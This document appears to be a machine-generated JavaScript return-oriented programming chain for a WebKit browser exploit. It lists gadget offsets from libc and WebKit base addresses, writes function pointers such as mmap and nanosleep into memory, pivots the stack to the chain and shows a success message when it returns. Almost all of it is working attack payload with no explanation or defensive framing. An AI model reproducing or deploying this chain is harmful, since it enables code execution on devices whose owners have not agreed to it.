set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([216, 0]); // 0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967072, 4294967295]); // -0xe0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967216, 4294967295]); // -0x50
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+547950, //mov rcx, [rdi + 0x18] ; lea rax, [rax + rcx - 1]
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877 //pop rsi
]);
db([1, 0]); // 0x1
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+196152, //L3139
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3139:
db([0, 0]); // 0x0
//L2917:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
nanosleep_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+197480, //L3140
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3140:
db([0, 0]); // 0x0
//L2904:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
mmap_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+198808, //L3141
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3141:
db([0, 0]); // 0x0
//L2913:
db([0, 0, 100000, 0, 0, 0]);
setTimeout(function(){
pivot(ropchain);
},500);
var main_ret = read_ptr_at(main_ret);
var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();

if(main_ret==179|| main_ret==0){
window.msgs.innerHTML="<h1 style='font-size:25px;color:green;text-align:center;'>"+LoadedMSG+"</h1>";
}